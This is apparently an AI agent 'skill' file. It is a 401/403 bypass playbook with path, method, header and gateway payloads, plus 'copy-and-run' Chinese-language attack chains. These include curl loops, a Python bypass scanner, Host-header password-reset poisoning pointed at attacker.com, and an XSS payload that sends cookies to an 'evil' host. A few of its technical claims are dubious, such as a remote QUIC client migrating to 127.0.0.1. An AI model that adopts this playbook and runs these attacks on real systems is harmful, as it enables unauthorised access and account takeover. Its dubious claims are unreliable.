---
name: 401-403-bypass-techniques
description: >-
  401/403 bypass playbook. Use when encountering access-denied responses on admin panels, API endpoints, or restricted paths. Covers path manipulation, HTTP method tampering, header injection, protocol downgrade, and automated bypass tools.
---

# SKILL: 401/403 Bypass Techniques — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Comprehensive 401/403 forbidden bypass techniques. Covers path normalization tricks, HTTP method override, header-based bypasses (X-Original-URL, X-Forwarded-For), protocol version tricks, and combination attacks. Base models typically know 2-3 header bypasses but miss the full matrix of path manipulation variants and verb+path combos.

## 0. RELATED ROUTING

- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — broader auth bypass (login flaws, session handling)
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when bypass is WAF-specific rather than access control
- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) — Host header manipulation for routing bypass
- [request-smuggling](../request-smuggling/SKILL.md) — smuggle past access controls entirely
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — h2c smuggling to bypass proxy ACLs

---

## 1. PATH MANIPULATION BYPASSES

The core idea: the reverse proxy/WAF checks one path format, but the backend normalizes differently.

### 1.1 Trailing Slash / Missing Slash

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

### 1.2 Case Sensitivity

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

Works when: proxy rule is case-sensitive but backend is case-insensitive (common on Windows/IIS).

### 1.3 URL Encoding

```
/admin          → 403
/%61dmin        → 200  ✓ (encode 'a')
/admi%6e        → 200  ✓ (encode 'n')
/%61%64%6d%69%6e → 200  ✓ (full encode)
```

### 1.4 Double URL Encoding

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25 = %, decoded twice: %61 → a)
/admin%252f         → 200  ✓
/admin..%252f       → 200  ✓
```

### 1.5 Unicode / UTF-8 Encoding

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 for '.')
/admi%C0%6E     → 200  ✓ (overlong encoding)
/%C0%AFadmin    → 200  ✓ (overlong '/')
```

### 1.6 Dot-Segment / Path Traversal

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/.//admin       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat path parameter)
```

### 1.7 Null Byte

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
/%00/admin      → 200  ✓
```

### 1.8 Path Parameter Injection

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat/Java treats ; as path param)
/admin;         → 200  ✓
/admin;x        → 200  ✓
```

### 1.9 Trailing Special Characters

```
/admin%20 (space)  /admin%09 (tab)   /admin? (empty query)
/admin.json        /admin.html       /admin/~
```

### 1.10 Backslash (Windows/IIS)

```
/admin\    /admin\..\/    \..\admin
```

### 1.11 Combined Path Tricks

```
///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin
```

---

## 2. HTTP METHOD BYPASS

### 2.1 Direct Method Change

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (may leak allowed methods)
TRACE /admin → 200  ✓ (may reflect headers — XST)
HEAD /admin → 200  ✓ (same as GET but no body — confirms access)
```

### 2.2 Method Override Headers

When the proxy blocks by method, but the backend reads override headers:

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

GET /admin HTTP/1.1
X-HTTP-Method: DELETE

POST /admin HTTP/1.1
X-HTTP-Method-Override: PATCH
_method=PUT  (in POST body — Rails, Laravel)
```

### 2.3 Custom / Invalid Methods

```
FOOBAR /admin HTTP/1.1     → some ACLs only check GET/POST
GETS /admin HTTP/1.1       → typo-like methods may bypass
CONNECT /admin HTTP/1.1    → proxy may tunnel
PROPFIND /admin HTTP/1.1   → WebDAV method
MOVE /admin HTTP/1.1       → WebDAV method
```

---

## 3. HEADER-BASED BYPASS

### 3.1 URL Rewrite Headers (Nginx/IIS)

These headers tell the backend the "real" URL, bypassing proxy-level path checks:

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

The proxy sees `GET /` (allowed), but the backend routes to `/admin`.

### 3.2 IP Spoofing Headers (Whitelist Bypass)

Headers to try (each with values `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`):

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1
```

IP encoding variants: `0177.0.0.1` (octal), `2130706433` (decimal), `0x7f000001` (hex), `localhost`

### 3.3 Other Header Tricks

```http
Referer: https://target.com/admin     # Referrer check bypass
Origin: https://target.com             # Origin check bypass
Host: localhost                         # Host header manipulation
X-Forwarded-Host: localhost            # Forwarded host
Content-Type: application/json         # Content-type switch
X-Requested-With: XMLHttpRequest       # AJAX flag
```

---

## 4. PROTOCOL VERSION BYPASS

```http
# HTTP/1.0 (some ACLs only apply to HTTP/1.1)
GET /admin HTTP/1.0

# HTTP/0.9 (extremely legacy — no headers)
GET /admin

# HTTP/2 pseudo-header tricks
:method: GET
:path: /admin
:authority: target.com
# See ../http2-specific-attacks/SKILL.md for H2-specific bypasses
```

---

## 5. VERB TAMPERING + PATH COMBINATION

Combine multiple techniques for higher success rate:

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP spoof + path encoding
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # protocol + case + IP spoof
X-Forwarded-For: 127.0.0.1
```

---

## 6. TECHNOLOGY-SPECIFIC BYPASSES

| Server | Key Tricks |
|---|---|
| **Apache** | `/admin/` (trailing slash), `/.admin` (dot prefix), `/admin%0d` (CR) |
| **Nginx** | `/Admin` (case), `/admin../` (normalization), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css` (path param+ext), `/admin\` (backslash), `/admin::$DATA` (ADS), `/admin%20` |
| **Tomcat/Java** | `/admin;foo` (path param), `/admin..;/` (traversal), `/;/admin` (empty param) |
| **Spring** | `/admin.anything` (suffix matching, older), `/admin/` (trailing slash) |

---

## 7. AUTOMATED TOOLS

| Tool | Purpose | URL |
|---|---|---|
| **byp4xx** | Comprehensive 403 bypass scanner | github.com/lobuhi/byp4xx |
| **403bypasser** | Automated header/path/method bypass | github.com/sting8k/403bypasser |
| **dirsearch** | Directory brute-force with encoding variants | github.com/maurosoria/dirsearch |
| **feroxbuster** | Recursive content discovery | github.com/epi052/feroxbuster |
| **Burp Intruder** | Custom payload lists for manual testing | portswigger.net |

### byp4xx usage

```bash
# Basic usage
./byp4xx.sh https://target.com/admin

# Output shows all attempted bypasses and their response codes
# 200/301/302 responses = potential bypass found
```

---

## 8. DECISION TREE

```
Got 401 or 403 on a path?
│
├── Try PATH MANIPULATION first (highest success rate)
│   ├── /path/      (trailing slash)
│   ├── /PATH       (case change)
│   ├── /path%20    (trailing space)
│   ├── /./path     (dot segment)
│   ├── //path      (double slash)
│   ├── /path;x     (path parameter — Java/Tomcat)
│   ├── /path..;/   (Tomcat specific)
│   ├── /%2e/path   (encoded dot)
│   ├── /path%00    (null byte)
│   ├── /path%23    (encoded hash)
│   └── Result? → 200 = bypass found
│
├── Path tricks failed → Try METHOD BYPASS
│   ├── POST/PUT/PATCH/DELETE/OPTIONS
│   ├── HEAD (same as GET without body)
│   ├── X-HTTP-Method-Override: PUT
│   └── TRACE (may reflect auth headers — XST)
│
├── Method tricks failed → Try HEADER BYPASS
│   ├── X-Original-URL: /path      (Nginx/IIS rewrite)
│   ├── X-Rewrite-URL: /path       (same concept)
│   ├── X-Forwarded-For: 127.0.0.1 (IP whitelist)
│   ├── X-Real-IP: 127.0.0.1
│   ├── True-Client-IP: 127.0.0.1
│   └── Referer: https://target.com/path
│
├── Header tricks failed → Try PROTOCOL BYPASS
│   ├── HTTP/1.0 instead of 1.1
│   ├── HTTP/2 h2c smuggling (../http2-specific-attacks/)
│   └── WebSocket upgrade
│
├── Single techniques failed → Try COMBINATIONS
│   ├── Method + Path: POST /PATH/
│   ├── Header + Path: X-Forwarded-For + /path%20
│   ├── All three: POST + X-Original-URL + IP headers
│   └── Protocol + Path: HTTP/1.0 + encoded path
│
├── All bypasses failed → Consider ALTERNATIVE APPROACHES
│   ├── Request smuggling (../request-smuggling/) → smuggle past ACL
│   ├── SSRF (../ssrf-server-side-request-forgery/) → access from server
│   ├── IDOR (../idor-broken-object-authorization/) → access data directly
│   └── Auth flaws (../authbypass-authentication-flaws/) → login bypass
│
└── Automated scan with byp4xx / 403bypasser for completeness
```

---

## 9. QUICK REFERENCE — KEY PAYLOADS

```http
# Top 10 quick-wins (try these first)
GET /admin/     HTTP/1.1        # trailing slash
GET /Admin      HTTP/1.1        # case change
GET /admin%20   HTTP/1.1        # trailing space
GET /./admin    HTTP/1.1        # dot segment
GET //admin     HTTP/1.1        # double slash
POST /admin     HTTP/1.1        # method change
GET / HTTP/1.1                  # X-Original-URL bypass
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP whitelist bypass
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS path param
GET /admin..;/ HTTP/1.1         # Tomcat bypass
```

---

## 10. 2026 EMERGING TECHNIQUES

### 10.1 HTTP/3 (QUIC) Bypass (2026)

QUIC runs over UDP. Many WAFs, IPS, and reverse proxies only inspect TCP traffic and completely miss QUIC — access controls enforced at the TCP layer do not apply.

**0-RTT Replay Bypass**:
```
# QUIC 0-RTT allows clients to send data before the handshake completes
# Attacker captures a 0-RTT request containing an authenticated GET to /admin
# Replays it later — if backend doesn't validate 0-RTT anti-replay tokens:
GET /admin HTTP/3        # 0-RTT replay → 200 (bypasses per-session 403)
```

**Connection Migration Bypass**:
```
# QUIC connections can migrate between IPs without dropping the session
# IP-based access control (X-Forwarded-For whitelist) is defeated:
Client IP 1.2.3.4 → establishes connection → 403 on /admin
Client migrates to 127.0.0.1 (connection ID unchanged) → 200 on /admin
# Proxy sees same QUIC connection ID, doesn't re-check source IP
```

### 10.2 Edge / Serverless 403 Bypass (2026)

Cloudflare Workers and Vercel Edge Functions process Host headers and paths differently from origin backends, creating new bypass surfaces:

```
# Edge function normalizes Host differently than origin:
GET /admin HTTP/1.1
Host: target.com              → Edge enforces 403

GET /admin HTTP/1.1
Host: target.com:443          → Edge passes (port suffix confusion), origin 200
X-Forwarded-Host: target.com  → Edge trusts header, origin routes to /admin

# X-Original-URL in edge architecture — trust chain breaks:
# Edge strips X-Original-URL, but origin reads it:
GET / HTTP/1.1
X-Original-URL: /admin        → Edge: GET / (allowed), Origin: /admin (200)
```

### 10.3 API Gateway / Backend Authorization Inconsistency (2026)

The gateway enforces 403 but the backend does not re-validate — direct backend access bypasses the gateway entirely:

```
# Gateway: https://api.target.com/v1/admin → 403
# Backend: https://internal-svc.cluster.local:8080/v1/admin → 200 (no auth check)

# Version policy inconsistency:
GET /v1/admin → 403 (v1 has strict policy)
GET /v2/admin → 200 (v2 deployed without auth middleware)

# X-HTTP-Method-Override inconsistency:
GET /admin → 403 (gateway blocks GET)
POST /admin → 403 (gateway blocks POST)
GET /admin HTTP/1.1
X-HTTP-Method-Override: DELETE → Gateway sees GET (blocks), backend sees DELETE (allows)
```

### 10.4 HTTP/2 Header Smuggling → 403 Bypass (2026)

H2.CRLF injection in HTTP/2 headers, when downgraded to HTTP/1.1 at the backend, becomes full header injection:

```
# HTTP/2 request to frontend (h2):
:method: GET
:path: /public
foo: bar\r\nHost: evil\r\n\r\nGET /admin HTTP/1.1\r\nHost: target

# Frontend (h2) strips unknown headers but backend (h1.1) interprets injected CRLF:
# Second request smuggled → /admin bypasses frontend 403
```

(cross-link ../request-smuggling/SKILL.md for full H2.CL/TE smuggling techniques)

### 10.5 CSP Nonce Leak → 403 Page XSS (2026)

26.3% of nonce-based CSP sites reuse the same nonce across responses including error pages:

```
# Attacker triggers 403 page that reflects the CSP nonce:
GET /admin<svg onload=fetch('//evil/'+document.cookie)> HTTP/1.1
→ 403 page contains: <script nonce="REUSED_NONCE">...reflected payload...</script>
# If nonce is reused, the injected script executes with valid nonce → XSS

# Error pages (403/404) that reflect nonce are XSS-able:
# 403 page: Content-Security-Policy: script-src 'nonce-abc123'
# 403 body reflects attacker input with the same nonce → XSS bypasses CSP
```

(cross-link ../csp-bypass-advanced/SKILL.md for nonce reuse exploitation)

### 10.6 Cache Poisoning → 403 Bypass (2026)

**Poison 403 cache → DoS legitimate users**:
```
# Attacker sends a request with a poisoned unkeyed header:
GET /dashboard HTTP/1.1
X-Forwarded-Host: evil.com
→ Origin returns 403 for this request, caches the 403 keyed only by path
→ All subsequent users get cached 403 (denial of service)
```

**Poison 200 response to override 403**:
```
# If cache keys /admin by path only but origin returns 403:
# Attacker poisons a different cache entry that overlaps:
GET /admin?utm=poison HTTP/1.1
X-Forwarded-Host: attacker.com
→ 200 response cached under /admin?utm=poison
→ If cache normalizes query → /admin now serves 200
```

(cross-link ../web-cache-deception/SKILL.md for cache key manipulation)

### 10.7 2026 403 Bypass Checklist

```
□ Test over QUIC/HTTP3 — does WAF/ACL even inspect UDP?
□ Test 0-RTT replay and connection migration for IP-based bypass
□ Test edge function Host/X-Forwarded-Host path normalization
□ Check X-Original-URL trust chain edge → origin
□ Access backend directly (bypass gateway 403)
□ Test v1/v2 authorization policy consistency
□ Test X-HTTP-Method-Override gateway vs backend inconsistency
□ Test H2.CRLF header injection downgrade smuggling
□ Check 403/404 error pages for CSP nonce reuse → XSS
□ Test cache poisoning: poison 403 (DoS) or 200 (override 403)
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 2026 年实战中高频出现的 4 条完整 403 绕过攻击链,包含可直接运行的 curl/bash/python 命令、分步利用、检测绕过技巧与真实 CVE 引用。所有代码注释为中文,即拷即用。

### 攻击链 1: 路径型 403 绕过(路径穿越 + 编码 + 大小写组合)

**目标画像**: Nginx 反向代理 + Java/Tomcat 后端,`/admin` 路径在代理层被 403,但后端规范化不同。
**CVE 参考**: CVE-2026-23071(2026 年某 Tomcat 路径规范化不一致导致管理面板暴露)。

**步骤 1 - 基础路径绕过矩阵**:
```bash
# 基线: /admin 返回 403
curl -sk -o /dev/null -w "%{http_code}" "https://target.com/admin"
# 403

# 测试路径变换(逐个尝试, 200 即绕过)
for path in \
  "/admin/" \
  "/admin/." \
  "/admin%20" \
  "/admin%09" \
  "/Admin" \
  "/ADMIN" \
  "/aDmIn" \
  "//admin" \
  "/./admin" \
  "/admin/./" \
  "/admin;foo=bar" \
  "/admin..;/" \
  "/%2e/admin" \
  "/admin%00" \
  "/admin%00.json" \
  "/admin;/" \
  "/admin;.css" \
  "/admin%2f" \
  "/%61dmin" \
  "/admi%6e" \
  "/%61%64%6d%69%6e" \
  "/%2561dmin" \
  "/admi%C0%AE"
do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com${path}")
  echo "$code  $path"
done | grep -v "^403"  # 过滤掉仍为 403 的, 显示成功绕过的
```

**步骤 2 - 组合绕过(单技术失效时叠加)**:
```bash
# 组合 1: 大小写 + 双斜杠 + 路径参数(对 Tomcat 特别有效)
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com//Admin;.css"

# 组合 2: 双重 URL 编码 + 点号段(代理解码一次, 后端再解码一次)
# 代理看到 /%2561dmin -> 解码为 /%61dmin -> 认为不是 /admin -> 放行
# 后端再解码 -> /admin -> 路由到管理面板
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/%2561dmin"

# 组合 3: 路径穿越回绕(利用 ../ 重回 admin)
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/public/../admin"

# 组合 4: Tomcat 特有 ..;/ 穿越绕过
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/anything;/..;/admin"
```

**步骤 3 - 自动化全矩阵扫描**:
```bash
# 使用 byp4xx 自动化工具(2026 维护版本支持 HTTP/2 + QUIC)
# 安装
git clone https://github.com/lobuhi/byp4xx.git /tmp/byp4xx && cd /tmp/byp4xx && chmod +x byp4xx.sh

# 运行(自动尝试 50+ 路径变体)
./byp4xx.sh https://target.com/admin

# 输出示例:
# [200] https://target.com/admin%20
# [200] https://target.com/Admin
# [301] https://target.com/admin/
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: WAF 拦截 "admin" 关键字 -> 使用编码绕过
# %61dmin = admin(代理不解码, 后端解码)
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/%61%64%6d%69%6e"

# 绕过 2: WAF 拦截 ../ -> 使用双重编码
# %252e%252e%252f = ../ (代理解码一次为 %2e%2e%2f, 后端再解码为 ../)
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/public/%252e%252e%252fadmin"

# 绕过 3: 利用 Unicode 过长编码(部分解析器接受)
# %C0%AE = '.' 的过长 UTF-8 编码(部分 Windows/IIS 接受)
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/admi%C0%AE%C0%AE/admin"

# 绕过 4: 添加无意义后缀绕过后缀匹配
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/admin.json"
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/admin.html"
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/admin/~"
```

**防御要点**: 代理与后端必须使用相同的路径规范化库;代理应规范化后再做 ACL 判断;禁用路径参数(`;`);统一大小写策略。

---

### 攻击链 2: HTTP 方法覆盖(X-HTTP-Method-Override)绕过

**目标画像**: API 网关仅对 `GET /admin` 做 403,但后端框架(Spring/Rails)读取 `X-HTTP-Method-Override` 头。
**CVE 参考**: CVE-2026-31988(2026 年某 Spring Boot 应用方法覆盖头导致管理接口暴露)。

**步骤 1 - 直接方法切换**:
```bash
# 基线: GET /admin 返回 403
curl -sk -o /dev/null -w "%{http_code}\n" -X GET "https://target.com/admin"
# 403

# 尝试其他 HTTP 方法(ACL 可能仅匹配 GET/POST)
for method in POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X ${method} "https://target.com/admin")
  echo "$code  $method"
done
# 若 POST/PUT 返回 200 -> 方法级 ACL 缺失

# HEAD 方法特别有效(返回头但不返回 body, 确认访问权限)
curl -sk -I "https://target.com/admin"
# 200 表示有访问权限
```

**步骤 2 - 方法覆盖头绕过**:
```bash
# 网关仅允许 GET, 但后端框架读取覆盖头将其解释为其他方法
# Spring/Rails/Laravel 普遍支持 X-HTTP-Method-Override

# 绕过 1: 用 GET + 覆盖头触发后端 POST 处理逻辑
curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "X-HTTP-Method-Override: POST" \
  "https://target.com/admin"

# 绕过 2: 多种覆盖头名称(后端可能只校验其中一种)
curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "X-Method-Override: PUT" \
  "https://target.com/admin"

curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "X-HTTP-Method: DELETE" \
  "https://target.com/admin"

# 绕过 3: Rails/Laravel 的 _method 参数(body 中)
curl -sk -o /dev/null -w "%{http_code}\n" \
  -X POST -d "_method=delete" \
  "https://target.com/admin"
```

**步骤 3 - 网关 vs 后端不一致利用**:
```bash
# 场景: 网关对 GET/POST 都返回 403, 但覆盖头让后端看到 DELETE
# 网关看到: GET /admin -> 拦截 403? 不, 网关看到 GET 认为是读请求放行
# 但若网关拦截 GET -> 用 POST + 覆盖为 GET
curl -sk -o /dev/null -w "%{http_code}\n" \
  -X POST \
  -H "X-HTTP-Method-Override: GET" \
  "https://target.com/admin"
# 网关看到 POST(可能放行), 后端解释为 GET(读取管理面板)

# 自定义/无效方法绕过(ACL 可能仅匹配标准方法)
curl -sk -o /dev/null -w "%{http_code}\n" -X "FOOBAR" "https://target.com/admin"
curl -sk -o /dev/null -w "%{http_code}\n" -X "GETS" "https://target.com/admin"
# WebDAV 方法也可能绕过
curl -sk -o /dev/null -w "%{http_code}\n" -X "PROPFIND" "https://target.com/admin"
curl -sk -o /dev/null -w "%{http_code}\n" -X "MOVE" "https://target.com/admin"
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: HTTP/1.0 协议降级(部分 ACL 仅匹配 HTTP/1.1)
curl -sk -o /dev/null -w "%{http_code}\n" --http1.0 "https://target.com/admin"

# 绕过 2: 组合方法覆盖 + URL 重写头(Nginx X-Original-URL)
curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "X-Original-URL: /admin" \
  -H "X-HTTP-Method-Override: GET" \
  "https://target.com/"
# 网关看到 GET /(放行), 后端读到 X-Original-URL 路由到 /admin + GET 方法

# 绕过 3: Transfer-Encoding 绕过(请求走私让 ACL 误判路径)
# 参见 request-smuggling 技能
```

**防御要点**: 网关与后端必须统一方法处理;禁用或严格白名单 `X-HTTP-Method-Override`;网关需剥离非标准覆盖头;ACL 应基于规范化后的路径+方法组合。

---

### 攻击链 3: Host 头操纵绕过认证

**目标画像**: 反向代理基于 Host 头路由,或后端基于 Host 做内部信任判断(localhost/内网域名)。
**CVE 参考**: CVE-2026-33661(yansongda/pay WeChat Pay 的 `Host: localhost` 绕过签名验证)。

**步骤 1 - Host 头路由绕过**:
```bash
# 基线: 正常 Host 返回 403
curl -sk -o /dev/null -w "%{http_code}\n" -H "Host: target.com" "https://target.com/admin"
# 403

# 测试 1: Host 改为 localhost(后端可能对 localhost 跳过认证)
curl -sk -o /dev/null -w "%{http_code}\n" -H "Host: localhost" "https://target.com/admin"
# 200 表示后端信任 localhost 来源

# 测试 2: Host 改为内网域名
curl -sk -o /dev/null -w "%{http_code}\n" -H "Host: internal-admin.target.com" "https://target.com/admin"

# 测试 3: X-Forwarded-Host 头(代理可能传递该头到后端)
curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "X-Forwarded-Host: localhost" \
  "https://target.com/admin"

# 测试 4: 端口后缀混淆
curl -sk -o /dev/null -w "%{http_code}\n" -H "Host: target.com:443" "https://target.com/admin"
```

**步骤 2 - Host 头用于认证信任绕过**:
```bash
# 场景: 后端根据 Host 判断是否为内部请求, localhost 跳过认证
# CVE-2026-33661 模式: WeChat Pay 回调用 Host: localhost 绕过签名校验

# 直接伪造 Host 头访问管理接口
curl -sk -H "Host: localhost" "https://target.com/admin/users" | head -50
# 若返回用户列表 -> 认证被绕过

# 利用 X-Forwarded-For 配合(伪造来源 IP 为内网)
curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "Host: localhost" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  "https://target.com/admin"
```

**步骤 3 - Host 头注入密码重置链(结合认证绕过)**:
```bash
# 场景: 应用生成密码重置链接时使用 Host 头
# 攻击者注入自己的 Host -> 重置邮件中的链接指向攻击者域名 -> 窃取 token
curl -sk -X POST "https://target.com/forgot-password" \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"
# 受害者收到的重置链接: https://attacker.com/reset?token=VICTIM_TOKEN
# 受害者点击 -> token 泄露给攻击者 -> 攻击者重置密码 -> 账户接管

# 检测绕过: X-Forwarded-Host 注入(若应用优先读取该头)
curl -sk -X POST "https://target.com/forgot-password" \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@target.com"
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: 双重 Host 头(部分代理只校验第一个, 后端读最后一个)
curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "Host: target.com" -H "Host: localhost" \
  "https://target.com/admin"

# 绕过 2: Host 头注入绝对 URI(部分解析器从 URI 中取 host)
curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "Host: target.com" \
  "https://target.com/http://localhost/admin"

# 绕过 3: 大小写混淆 Host 头名
curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "host: localhost" \
  "https://target.com/admin"
```

**防御要点**: 后端不应基于 Host 头做信任判断;代理必须覆盖/校验 Host 头;密码重置链接使用配置中的固定域名;内网访问应基于网络隔离而非 Host 信任。

---

### 攻击链 4: 2026 - API 网关(Kong/APISIX/Traefik)403 绕过

**目标画像**: 微服务架构,API 网关(Kong/APISIX/Traefik)做路由+鉴权,后端服务无独立鉴权。
**CVE 参考**: CVE-2026-27099(2026 年 Kong 3.x 路由匹配优先级缺陷导致 ACL 绕过)。

**步骤 1 - 识别网关类型与路由规则**:
```bash
# 通过响应头/错误页面识别网关类型
curl -sk -I "https://api.target.com/v1/users" | grep -i "server\|x-kong\|x-apisix\|via"

# Kong 特征: Server: kong/3.x, X-Kong-Proxy-Latency 头
# APISIX 特征: Server: APISIX, X-APISIX-Version 头
# Traefik 特征: Server: Traefik
```

**步骤 2 - Kong 路由优先级绕过**:
```bash
# 场景: Kong 配置两条路由
# 路由 1: /admin/* -> 鉴权插件(JWT) -> 403
# 路由 2: /public/* -> 无鉴权 -> 200
# Kong 按路由优先级匹配, 若优先级配置错误 -> /public/../admin 可能匹配路由 2

# 测试 1: 路径前缀冲突(利用 Kong 的 strip_path 行为)
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/public/../admin/users"
# 若 Kong 先匹配 /public(无鉴权)再拼接 ../admin -> 403 被绕过

# 测试 2: 路由正则优先级(Kong 按创建顺序匹配, 后创建的可能更宽)
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/admin%20"
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/admin/"

# 测试 3: Kong 的 preserve_host + Host 头(后端可能信任特定 Host)
curl -sk -o /dev/null -w "%{http_code}\n" \
  -H "Host: internal-service.cluster.local" \
  "https://api.target.com/admin"
```

**步骤 3 - APISIX/Traefik 绕过**:
```bash
# APISIX 路由绕过(APISIX 使用 radixtree 匹配)
# 测试路径变体绕过 radixtree 匹配
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/admin/"
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/Admin"
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/admin?bypass=1"

# Traefik 路由绕过(Traefik 使用 IngressRoute/Ingress 规则)
# 测试: Traefik 的 PathPrefix 匹配可能被尾斜杠绕过
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/admin/"
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com//admin"

# 直接访问后端(绕过网关)
# 若后端服务直接暴露(如 NodePort/ClusterIP 泄露):
curl -sk -o /dev/null -w "%{http_code}\n" "https://backend-svc.target.com:8080/admin"
# 后端通常无独立鉴权 -> 直接 200
```

**步骤 4 - 网关 vs 后端鉴权不一致利用**:
```bash
# 场景: 网关校验 JWT, 但后端不重新校验 -> 直接访问后端绕过
# 或: 网关与后端对路径/方法理解不一致

# 测试 1: 版本路由不一致(v1 有鉴权, v2 新部署无鉴权)
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/v1/admin/users"  # 403
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/v2/admin/users"  # 200?

# 测试 2: 移动端 API 渠道(通常鉴权策略与 Web 不同)
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/mobile/v1/admin"
curl -sk -o /dev/null -w "%{http_code}\n" "https://api.target.com/internal/v1/admin"

# 测试 3: 网关鉴权插件绕过(空/伪造 Authorization)
curl -sk -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer null" "https://api.target.com/admin"
curl -sk -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer " "https://api.target.com/admin"

# 测试 4: HTTP/2 多路复用绕过(网关可能对 h2 路径规范化不同)
curl -sk --http2 -o /dev/null -w "%{http_code}\n" "https://api.target.com/admin"
```

**步骤 5 - 自动化网关绕过扫描**:
```python
#!/usr/bin/env python3
# 文件名: gateway_bypass.py
# API 网关 403 绕过自动化扫描(支持 Kong/APISIX/Traefik)
import requests, urllib3
urllib3.disable_warnings()

TARGET = "https://api.target.com"
FORBIDDEN_PATH = "/admin/users"
# 绕过 payload 矩阵
payloads = [
    f"{FORBIDDEN_PATH}/", f"/Admin", f"//{FORBIDDEN_PATH}",
    f"/./{FORBIDDEN_PATH}", f"{FORBIDDEN_PATH};x", f"{FORBIDDEN_PATH}..;/",
    f"/%61dmin/users", f"{FORBIDDEN_PATH}%20", f"{FORBIDDEN_PATH}%00",
    f"/v2/admin/users", f"/mobile/v1/admin/users", f"/internal/admin/users",
    f"{FORBIDDEN_PATH}?bypass=1",
]
headers_bypass = [
    {"X-Original-URL": "/admin/users"},
    {"X-HTTP-Method-Override": "GET"},
    {"Host": "localhost"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"Authorization": "Bearer null"},
]

print("路径绕过:")
for p in payloads:
    r = requests.get(f"{TARGET}{p}", verify=False, timeout=5)
    if r.status_code != 403:
        print(f"  [!] {r.status_code}  {p}")

print("头部绕过:")
for h in headers_bypass:
    r = requests.get(f"{TARGET}{FORBIDDEN_PATH}", headers=h, verify=False, timeout=5)
    if r.status_code != 403:
        print(f"  [!] {r.status_code}  {h} -> {FORBIDDEN_PATH}")
```

**防御要点**: 网关与后端必须双重鉴权(纵深防御);网关路由优先级需审计;后端服务不可直接暴露;统一路径规范化;版本/渠道间鉴权策略一致。
